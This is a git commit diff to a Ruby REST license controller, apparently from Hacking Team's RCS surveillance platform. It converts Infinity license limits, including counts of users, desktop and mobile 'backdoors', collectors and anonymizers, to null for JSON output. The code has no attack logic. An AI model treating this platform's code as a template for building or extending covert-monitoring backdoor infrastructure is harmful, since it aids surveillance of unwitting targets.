57f7057d48edd44748f3ab9660c27598a16e7bb7
alor <alor@hackingteam.it>
2011-05-18 14:54:05 +0200

    Infinity to null for JSON

--- lib/rcs-db/rest/license.rb
+++ lib/rcs-db/rest/license.rb
@@ -9,8 +9,22 @@ class LicenseController < RESTController
 
   def limit
     require_auth_level :admin, :tech, :view
+
+    limits = LicenseManager.instance.limits
+
+    # a trick to get the Infinity value
+    inf = 1.0/0
     
-    return STATUS_OK, *json_reply(LicenseManager.instance.limits)
+    # convert the Infinity to null (needed by the JSON deserializer in flex)
+    limits[:users] = nil if limits[:users] == inf
+    limits[:backdoors][:total] = nil if limits[:backdoors][:total] == inf
+    limits[:backdoors][:desktop] = nil if limits[:backdoors][:desktop] == inf
+    limits[:backdoors][:mobile] = nil if limits[:backdoors][:mobile] == inf
+    limits[:collectors][:collectors] = nil if limits[:collectors][:collectors] == inf
+    limits[:collectors][:anonymizers] = nil if limits[:collectors][:anonymizers] == inf
+    limits[:ipa] = nil if limits[:ipa] == inf
+
+    return STATUS_OK, *json_reply(limits)
   end
 
   def count
